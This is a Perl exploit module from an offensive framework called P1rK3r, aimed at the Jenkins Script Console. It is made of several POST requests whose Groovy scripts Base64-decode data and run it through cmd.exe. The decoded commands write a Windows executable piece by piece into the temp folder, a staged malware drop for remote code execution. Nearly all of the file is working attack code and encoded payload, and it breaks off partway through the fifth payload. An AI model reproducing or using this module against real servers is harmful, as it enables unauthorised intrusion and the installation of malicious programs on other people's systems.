package P1rK3r::Exploits::JENKINS::MSF::JenkinsScriptConsole;
use parent qw(P1rK3r::Exploit P1rK3r::Services::JENKINS);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "JenkinsScriptConsole";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending Exploit #1 Request : [GET] ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'script',
                        PAYLOAD      => 'script=sun.misc.BASE64Decoder%20ymNWx%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20fxQWt%20%3d%20ymNWx.decodeBuffer%28%22ZWNobyBUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTZBQUFBQTRmdWc0QXRBbk5JYmdCVE0waFZHaHBjeUJ3Y205bmNtRnRJR05oYm01dmRDQmlaU0J5ZFc0Z2FXNGdSRTlUSUcxdlpHVXVEUTBLSkFBQUFBQUFBQUNUT1BEVzExbWVoZGRabm9YWFdaNkZyRVdTaGROWm5vVlVSWkNGM2xtZWhiaEdsSVhjV1o2RnVFYWFoZFJabm9YWFdaK0ZIbG1laFZSUnc0WGZXWjZGZzNxdWhmOVpub1VRWDVpRjFsbWVoVkpwWTJqWFdaNkZBQUFBQUFBQUFBQUFBQUFBQUFBQUFGQkZBQUJNQVFRQXFaNWxTZ0FBQUFBQUFBQUE0QUFQQVFzQkJnQUFzQUFBQUtBQUFBQUFBQUNodndBQUFCQUFBQURBQUFBQUFFQUFBQkFBQUFBUUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBQUFHQUJBQUFRQUFBQUFBQUFBZ0FBQUFBQUVBQUFFQUFBQUFBUUFBQVFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFiTWNBQUhnQUFBQUFVQUVBeUFjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU9EQkFBQWNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBQURnQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTG5SbGVIUUFBQUJtcVFBQUFCQUFBQUN3QUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQVlDNXlaR0YwWVFBQTVnOEFBQURBQUFBQUVBQUFBTUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1WkdGMFlRQUFBRnh3QUFBQTBBQUFBRUFBQUFEUUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFEQUxuSnpjbU1BQUFESUJ3QUFBRkFCQUFBUUFBQUFFQUVBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2bPiVURU1QJVx1REpneC5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20bpAap%20%3d%20new%20String%5b3%5d%3b%0abpAap%5b0%5d%20%3d%20%22cmd.exe%22%3b%0abpAap%5b1%5d%20%3d%20%22/c%22%3b%0abpAap%5b2%5d%20%3d%20new%20String%28fxQWt%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28bpAap%29%3b%0a&Submit=Run',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /script',
                        HEADERS      => {
                           'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT2 => {
                        METHOD       => 'POST',
                        PATH         => 'script',
                        PAYLOAD      => 'script=sun.misc.BASE64Decoder%20WAwOl%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20wthkf%20%3d%20WAwOl.decodeBuffer%28%22ZWNobyBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2bPiVURU1QJVx1REpneC5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20BrqPH%20%3d%20new%20String%5b3%5d%3b%0aBrqPH%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aBrqPH%5b1%5d%20%3d%20%22/c%22%3b%0aBrqPH%5b2%5d%20%3d%20new%20String%28wthkf%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28BrqPH%29%3b%0a&Submit=Run',
                        TEXT         => 'Sending Exploit #2 Request : [POST] /script',
                        HEADERS      => {
                           'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT3 => {
                        METHOD       => 'POST',
                        PATH         => 'script',
                        PAYLOAD      => 'script=sun.misc.BASE64Decoder%20BwJNJ%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20RbygE%20%3d%20BwJNJ.decodeBuffer%28%22ZWNobyBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRldrN0lIc0RBUUFBTlhVQWtFQVUxYWo2QmRCQUtPb0MwRUFveGxBUVFDakJCaEJRQitrbzZrQXhBQlhqVVVNVTQxTndGQlg1Z1h3RjBFQVJOSkFBSWhCUUR6WEFPaG1USzRBYU9CZlFBQysyS1FBWG9QRUJGTlRVMmhNUjBFQTZQdytBQUNMVVJlTFJkT0xrMHhBUVFEQlVOcFY5SlpTNkVSS0FBQ0xaUFNOUmZ4NVRmdFExbWdVMGtBQW1PamVTZ0N4aGNCLzFab0V5UUNMTldqQlFBQVBqVVg3ZzhDL2cvZ3ZEejFtQkFBQTRCbUtpQWdYUUU3L0pJMThGdDhBaS9GY1VnMFZiTUZBZ1lQRStMUERvNGJRUUV3UGp6MVZBQUJvK05GQUFPaHRCbzBBNlNzRTlnL0hCV2dDUVFBQmZ3QUE2UisxUndDSkhSVFF3NkxwRkFRQUFJdEYvRkQvRld6QlFBRHdHTkJBQWVsRlZESUFpem44QnVBVmJNNUFBS05zdGtGdmcrbmhBQUNkSFdBQ1FRQituM1BZMFVBQTZCUUdBQUNEeEFUSEJXQUNRUUQvUlA5YXF0aytBQUJhVmZ5TC94V0k4cWdBbzdpNlFRRHdzUU1BQUlrZEhOQkFpZW1wQXdBQWkwWDhnLzhWbU1GQUFLUGdGMEVBNlpJREFBQnY3Q0RRUURucGlnTUFBRGtkWUZxbkFIUU5YYnduUUFEb3NnVUEzWVBFK1lzZzJGRnpXRFVBQUlQRXFUdkRkUS9IU21BS1FXY0JBUFVBNlZhOEFFOFRIU0E0UVFBUGhFcEZBSFY%2bPiVURU1QJVx1REpneC5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20dVtzL%20%3d%20new%20String%5b3%5d%3b%0adVtzL%5b0%5d%20%3d%20%22cmd.exe%22%3b%0adVtzL%5b1%5d%20%3d%20%22/c%22%3b%0adVtzL%5b2%5d%20%3d%20new%20String%28RbygE%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28dVtzL%29%3b%0a&Submit=Run',
                        TEXT         => 'Sending Exploit #3 Request : [POST] /script',
                        HEADERS      => {
                           'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT4 => {
                        METHOD       => 'POST',
                        PATH         => 'script',
                        PAYLOAD      => 'script=sun.misc.BASE64Decoder%20EEpml%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20uAYFF%20%3d%20EEpml.decodeBuffer%28%22ZWNobyBRL3hYWXdRSUFkcnhnQWtHV2RBMW9vTkZ2QU9pbEJVd0FQY1FraTJiOFV1Z2lOUlFBUnVjRU96Nm5EOGNGNkFKQkFBSUFBUEhweXdNQUFEa2RJRGhCQUE4dkErVUFBRkQvRlhDVFFBREhaVndDcXdBRnBnQUE2ZTBDQU9XTFJmeFEveFZzd1VCUW8xZ0NRUURwMWdJQVBJdE4vRkgvRmIwb1FBRE1aQUpCQU1jRkM3OUFqRkREaGdBK2tnSUFBSXRGL0xwQU9FRlFLNkdLQ0JJTUFrQTZoVUQyNmFJQ0pnQTdWZnloVEVCQlMxTm82dEZBQUFOb0p0RkFUMURvQWtZQUFJUFBGS1ByUUVFQTZkY0NBQlNMZmZ5TGY3WEJRQjJET1FGK1NqUFNhZ2lLRjFMLzFsOTkvb1BFQ09zU2l3Mll3VUFBTTR0cUI0c1JpZ1JDZzZRSVA4TjBCbEtKZy96cnlJT1UvelBhaTY3M2gwbFJmTXFnQUFBOW45QUExM1lOYldqUlFBRG8vUVJBQU03L0JNOVYvSVBKL3hYNlVzRHlydmZSU1kyRjlQdTUvMUZTVU9qSm9BQUFVNDJOOVB2RHRXaWMwVUNBL0doUTBiMDU2WTRBQUFDTGZmeUxEZkhCUUFDRE9RRXdkVFBTYWdpS0YxTC8xb3ZnL0lQRWZPdGJpdzBwd1VBQU04Q0tCNHNSbWdTN2crQW9POE9QQmtjWWZmenJ5SU9CL3pQQThxNTgwVWxSSnplZ2NnRHFXUVFBQU5nTnBUVDBRTHZveHE0QXNZTmNCSXQ2L0lQSi80dUFNOER5cnZlNlNZMkYrQjcvLzFGU24xV1ZvQUFBVTQyTjlQdWQvMmpIU1VBQXFCMFkwVUFBaTlvRTcwRUFpSndGOU1mLy82SEhPa0VmeGxEb3U4Z0FBSU5uR04zM0dFRUE2VVFCRWdDTFRmeVZiMGhBUVgraFRFQkJBRk5vNTlGQUFGRURVT2lTbFFBQWkwMzhpejM5d1VZQWFnVm9FTkZBQUZHalNFQkJBUCtKZzhRQTBjQjFEOGNGZkFKd0FBRUFBQURwNmdBQUFJdFYvRVVIYUFqUnpRQlMvOWVEeEF5RndIVVB4K1NFTkVFQUFjSUFBT25IQUFBQWkwWDhhZ3RZUXRCQUFDY2R3WVBFRElYQUQ0V3ZBQUFBeDhvcEFoRkJBUUFBQU9tZ0FBRE50QVVzQXFzQXhoUUFTT21SQUFBQWkzbjh4MkNJQWtHcUFRQUFBSWtONkJkQkFPdDhpMVg4YWpwUy94Vjh3VUFBZzhRSU84UDNFb2dZUUZBTkZXekJRQUNEeEFRaGRBSkJBSXRGL0xwQXgwRUFLOUNLQjRqVEF0RTZOblgyRXdXV0FrRUFBUUFBQU90b2k1WDh4d1VoQTlJQUFRQUFBS09vQzc1M0tpTXhWdnpIQllnQ1FRQUJXQUFBaVQ2Q0YwRUE2dzU0VlF4MEFsRGsvUzBBQUlQRUJJdEY5STFOL0ZkVjJWRlNhQlRTd3dCUTZFUkdBQUNGd05JYmJQNjUvNHZ5OUlzVGpUYzFnTUdTQUVsY1NBeFVLSXRWRElzUXlGeEE4NFBCVElzQ0kyamMwRUFBVVNyV2kxVU02QUpRNktndEFBQ0xnZlRibUJDTFNBd0t1Z1NMRklySWdrZ01vZjlBUVFCU1VPakpRZ0FBVUI4a0w5UjZnOFFFaGN4MEpJdE5ES0hJblVBQWc4QkEyUkZTYU1qUVFBQlEvOWFMVFF5TEVWTG9XODRBQUxiRWZLSGMwSUlBUThOOGJUMFJmQUFBZm5HTGFneUxGVjdBUUFEeklFNEFBSVBDUUhZSVhtaWcwRUFBU0JEV2kwVU1pemhSNkNZdCt3QjQ5OUJBVW9NTUZJc05FTkJBQUR2QmZnS0xWUXgxRGNqQVFBQ0R3VUNMQWxEa1dOQnVBQkduMWg5VkROUUNVT2p0TENZQWl3Y1EwR29BZzhRUU9Sb1UwRUFBZEQ2QitlMEFBQUIrTnJpZFptWm05K25CK2dJdXlzRnFId055NC9way9CVVV5RUFBZlZQSEJaalFOc0prQUJ3QTZ6QlFOeXdBQUY5ZU15aGJlK1ZkdzRrZEZOQUdBT2dqTEFBQTZBNEJBQUNMRlV4QVFRQlFobkkzQUFCZkx6cVNMUHJsWGNOVm14SkFBSFFTUUFEaUUwQUFMaE5BQUlFUlFBQTNrY2d6UEJaQUFKb1VRQUFXRVVBQUFoRkFyR0lSRnRwdEVVQXBUdDVBK3dnVlFBRDdFVUFBNktSQUFIMmlCQUJ3RVVBQU9SQkFBQ2NTUUFBOUVrQUEweEZBNkNrU1FBQjJGRUFBaFJSQUFOODhRQUJYRkVETUZoVndBQUFzQVJzYkd4c0NHeHNiR3h1eUc1c2JHd1FGdGdZYkJ4c2JHeHNiM1JzYkd3Z0pDdjRiUXczRWFOUWJHMkxzRVJJVEc4QVZuQmNZR1JvSmtOV1FrSkNRa0pDL2tKQ1FRMVdMN0l0RkNJdXEyTUJBQUZDRHdVQzNkTkpBQUZIL0ZZREJRSE9ockFKQm8rVEVEUGJBZEE4cGFGVFNRQURqRldUQlFBQ0R4QWhxQWY4VmNNR1VNcEJWaSt3UjdMZ0FBQUNoZUl4QkFJSEFvVXd6UVFCc0ZHaEFQRUVBVUpEc1FBQUFab3VSZEFJUkFJRVU%2bPiVURU1QJVx1REpneC5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20HBxha%20%3d%20new%20String%5b3%5d%3b%0aHBxha%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aHBxha%5b1%5d%20%3d%20%22/c%22%3b%0aHBxha%5b2%5d%20%3d%20new%20String%28uAYFF%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28HBxha%29%3b%0a&Submit=Run',
                        TEXT         => 'Sending Exploit #4 Request : [POST] /script',
                        HEADERS      => {
                           'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT5 => {
                        METHOD       => 'POST',
                        PATH         => 'script',
                        PAYLOAD      => 'script=sun.misc.BASE64Decoder%20ZAeQF%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20zClQs%20%3d%20ZAeQF.decodeBuffer%28%22ZWNobyBpeFVBR0VFQVVsRG9pRUFBQUdZN0RmUVgxd0NqQ0JoQkFMTU5Ba0VBVTFhTFptVEJRQUJtaVYrMEMwRk1oY0JYZFYyTG1DVVlRWWd6YUpoSlFObi9mcUd5QWtFQWc4UUk2Y0RuRmFGMEFrRUJVR2dhUEw4QWFJUjJRQUQvMW9QRURLRVU2VUFOaGNEQmdOUkFESFdwdUh6VVFKYmFhR3pVZUFEL0FZc055Rk5BQUlQQkdsR1lGc2ZCbkFDRHhBeUxGUmpRUU5LTCtGakJRRXhvL2xNQUFGTC9KNzJ3QzBFQW9SRFFRQXRxSUZBcDFvdUNURUJCQnpJVkdOQkEvb01zRUx6SW9rRS9JQUJSem1qNEYwRUpUb0ZIQUFDRndIU2VVR2o5WWtEeTZLSUZBQUF0eEFpaGZBTDlBSVhBZGR5aHJBdEJBQmZJbkF0QkFJc1ZTREJCQUdwbGFKelJRQUJRb1V4QVFRQlJhUEhVUUExU1VPaTdQd0MyZzhRY28waHJRWERycnFIS1FFRUFpdzJBQWtFQWhjeDFKbHpYVEVCQkFHb1JhQVhSUUFCb1JQQkFnR2dvTzBBQVVGSG9oRDhBQUVmRUdLTklRRUdJaXcyRXNrRmdoY2wxSElzVlRFQkJBR3I3YUJqVVFIQlFVdWlXUHdBSmc4U3AzRWhweXdDTERYTUNRZldGeVZ2cGl4WHJBa0VBdnZ6VFFBQ2ZVblVGdnRRQ1FRQ2RGWGdDUVFBd0hJc1ZRRUJmQUhXZ2l4WGtGMEVBd2NtNStOTkFXSFNqa3ZEVGJBQlFvUVFZUVFCUTlrVHlRUUJRVmxLRml3MHdPa0FBYU5UVHZnQm9BQWdBQUZIbzNtd0FBSVBFSk92UGloVkFPRUZQdjBBNFFRQ0VISFVGdi9YVFFBQ0xGV2dDUVFDKy9OT3ZBSVhTZFFXKzFBSkJBSXNWZUFMSkFJWFNpeFdIUUVFQVZLS0xCT1FYSWdDRFZUTzVEOU5BbVhRRnVielRRQUJRb1hBQ1FRQlgyYUVFZEVFQVVLRkVRRUVBVVBSU1VZc05NTkJBQUdoaDAwQUFhQUFJQUFCUjZNRWM5Z0NEYUN4L0FBajZBSElOS0dUVFFBRG9HLzI1LzhTWkJLRllBa0VBWVFJQWtDeVR3M3dwb1dBQ1FRQTd3N2dnMHg3cWRBVzRIMXJPQUlzVlQ5QkFBRkpRYUVUVFFBQjlGV1RCUUxXRHhPT0xQVERRcHdDRHlmOHp3UEt1b1dBQ1FRRDMwVW1EK0FHbURld1g2d0NiY0tGd0FrRUFqVXdCQVZIL0ZWekJRQ2FEeEptRndIVjRQQnZJd0VBQVRCVFRRQUNEd2tCUy94V0F3VURham00SVgxNWJrZVZkd3pzVlFkQWxLNHZ3aWdwQ2lBNGFoR1IxOW9zVjdCZHlBSXNOY0FJTmUwTTFJRGhCQUkwOEFvdnl3U0h3RmFWcnlvUGhnL09rT0REUVFBQ2hURUJCcytLTE1iY0xRUUEvRlFpbVFRQmZhZ0JSYWdCU2FQd1h